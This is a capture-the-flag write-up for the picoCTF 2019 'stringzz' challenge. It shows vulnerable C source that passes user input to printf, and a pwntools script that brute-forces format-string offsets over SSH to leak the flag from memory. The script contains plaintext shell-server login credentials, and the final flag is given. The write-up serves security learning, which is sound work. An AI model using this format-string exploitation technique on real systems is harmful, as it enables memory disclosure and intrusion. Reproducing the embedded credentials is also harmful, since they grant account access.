# Problem
Use a format string to pwn this [program](https://2019shell1.picoctf.com/static/30898633a200c66857014a1e600171fd/vuln) and get a flag. Its also found in /problems/stringzz_4_a95d63468fc56e11a9e406b68c4b3a4a on the shell server. [Source](https://2019shell1.picoctf.com/static/30898633a200c66857014a1e600171fd/vuln).

## Hints:

http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/30898633a200c66857014a1e600171fd/vuln
wget https://2019shell1.picoctf.com/static/30898633a200c66857014a1e600171fd/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAG_BUFFER 128
#define LINE_BUFFER_SIZE 2000

void printMessage3(char *in)
{
  puts("will be printed:\n");
  printf(in);
}
void printMessage2(char *in)
{
  puts("your input ");
  printMessage3(in);
}

void printMessage1(char *in)
{
  puts("Now ");
  printMessage2(in);
}

int main (int argc, char **argv)
{
    puts("input whatever string you want; then it will be printed back:\n");
    int read;
    unsigned int len;
    char *input = NULL;
    getline(&input, &len, stdin);
    //There is no win function, but the flag is wandering in the memory!
    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    printMessage1(input);
    fflush(stdout);
 
}
```

We can see that ```input``` will be treated as the [format string](https://en.wikipedia.org/wiki/Printf_format_string).
We can try to calculate the exact offset of ```buf```, of just enumerate it.

Let's write a simple code
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  pass
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)

  s.set_working_directory('/problems/stringzz_4_a95d63468fc56e11a9e406b68c4b3a4a')
  p = s.process('./vuln')

offset = 0

while True:
  if debug:
    p = process('./vuln')
  else:
    p = s.process('./vuln')

  print p.recv()

  p.sendline('%{}$s'.format(offset))

  flag = p.recvall()

  if 'picoCTF' in flag:
    log.info('Found flag at offset: {}'.format(offset))

    break

  p.close()

  offset += 1

print flag
```

And we found it in offset ```37```.

Flag: picoCTF{str1nG_CH3353_159c98a8}